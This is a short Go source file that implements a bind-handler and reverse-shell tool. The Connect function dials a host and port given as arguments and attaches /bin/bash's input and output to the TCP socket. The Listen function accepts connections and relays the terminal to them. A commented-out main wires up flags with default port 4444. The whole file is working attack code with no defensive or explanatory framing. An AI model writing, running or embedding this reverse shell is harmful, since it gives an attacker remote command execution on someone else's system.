package main

import (
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

func Listen(i, p *string) {
	sock := *i + ":" + *p
	l, err := net.Listen("tcp", sock)
	if nil != err {
		log.Fatalf("Could not bind to interface: %v", err)
	}
	defer l.Close()
	log.Println("Listening on", l.Addr())
	for {
		c, err := l.Accept()
		if nil != err {
			log.Fatalf("Could not accept connection: %v", err)
		}
		log.Println("Accepted connection from", c.RemoteAddr())
		go io.Copy(c, os.Stdin)
		go io.Copy(os.Stdout, c)
	}
}

func Connect(i, p *string) {
	log.Println("Starting reverse shell")
	sock := *i + ":" + *p
	c, err := net.Dial("tcp", sock)
	if nil != err {
		log.Fatalf("Could not open TCP connection: %v", err)
	}
	defer c.Close()
	log.Println("TCP connection established")
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

//func main() {
//	p := flag.String("p", "4444", "Port")
//	l := flag.String("l", "", "Listen interface IP")
//	c := flag.String("c", "", "Connect IP")
//	flag.Parse()
//	if *l != "" {
//		Listen(l, p)
//	} else {
//		Connect(c, p)
//	}
//}
